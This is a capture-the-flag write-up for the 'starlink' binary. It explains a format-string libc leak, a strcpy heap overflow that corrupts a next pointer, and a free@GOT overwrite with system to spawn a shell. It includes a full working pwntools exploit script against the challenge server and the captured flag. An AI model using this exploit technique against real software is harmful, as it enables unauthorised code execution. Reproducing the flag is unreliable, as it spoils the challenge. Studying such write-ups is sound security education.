# starlink - Write-up

## 1. Recon
- Binary: `starlink` (64-bit, non-PIE, NX, Canary, Partial RELRO).
- Important globals:
  - `head` list pointer at `0x4040e8`
  - `free@GOT` at `0x404000`
- Node layout from reverse:
  - `name`: 0x19 bytes
  - `content`: 0x101 bytes
  - `next`: at offset `0x120`

## 2. Vulnerabilities
- **Format string at startup**: user name is printed with `printf(name)` (no format).
  - Leak used: `%9$p` gives a libc code pointer.
- **Heap overflow in update**:
  - Update uses `strcpy(node->content, buf)` where `buf` can be up to 0x400 bytes.
  - `content` is only 0x101 bytes, so overwrite reaches `next` pointer (`+0x120`).
- **Arbitrary write primitive**:
  - Corrupt `next` to point near `.got`.
  - Then run update with empty name, it matches corrupted node and writes attacker-controlled data to chosen address.

## 3. Exploit plan
- Leak libc pointer with `%9$p`.
- Compute libc base:
  - `libc_base = leak9 - 0x2a1ca`
- Compute `system`:
  - `system = libc_base + 0x58750`
- Create node named `/bin/sh`.
- Overflow its content to set `next = 0x403fe7`.
  - This makes `(node+0x19)` land on `0x404000` (`free@GOT`) during next update.
- Update with empty name and payload `p64(system)` to overwrite `free@GOT`.
- Delete `/bin/sh` node:
  - Program calls `free("/bin/sh")` -> now `system("/bin/sh")`.
- Send command: `cat /flag`.

## 4. Final flag
- `UVT{wh444t_h0us3_0f_sp1r1t_1n_th3_b1g_2026_ph4nt4sm4l_ph4nt4smagor14_1s_1t_y0u_06112009_JSdlsadasd8348Gh}`

## 5. Exploit script (pwntools)

```python
from pwn import *

HOST, PORT = "194.102.62.166", 30685
LIBC_LEAK9_OFF = 0x2a1ca
SYSTEM_OFF = 0x58750

def menu(p, c): p.sendlineafter(b'> ', str(c).encode())
def create(p, n, c):
    menu(p, 1)
    p.sendlineafter(b'max 24):', n)
    p.sendlineafter(b'max 256):', c)

def update(p, n, c):
    menu(p, 2)
    p.sendlineafter(b'update:', n)
    p.sendlineafter(b'content :', c)

def delete(p, n):
    menu(p, 3)
    p.sendlineafter(b'delete:', n)

p = remote(HOST, PORT)

# startup dialogue
p.recvuntil(b'>'); p.sendline(b'A')
p.recvuntil(b'>'); p.sendline(b'1')
p.recvuntil(b'word'); p.sendline(b'BBBB')
p.recvuntil(b'?'); p.sendline(b'%9$p')

data = p.recvuntil(b'1.Create')
line = [x for x in data.split(b'\n') if b'welcome' in x][0]
leak9 = int(line.split(b'welcome ')[1], 16)

libc_base = leak9 - LIBC_LEAK9_OFF
system = libc_base + SYSTEM_OFF

create(p, b'/bin/sh', b'A')

# overflow content -> overwrite next pointer to 0x403fe7
update(p, b'/bin/sh', b'B' * 0x107 + b'\xe7\x3f\x40')

# empty name matches corrupted fake node, write to free@GOT
update(p, b'', p64(system))

# triggers system("/bin/sh")
delete(p, b'/bin/sh')

p.sendline(b'cat /flag')
print(p.recv(timeout=2).decode('latin1', errors='ignore'))
p.interactive()
```
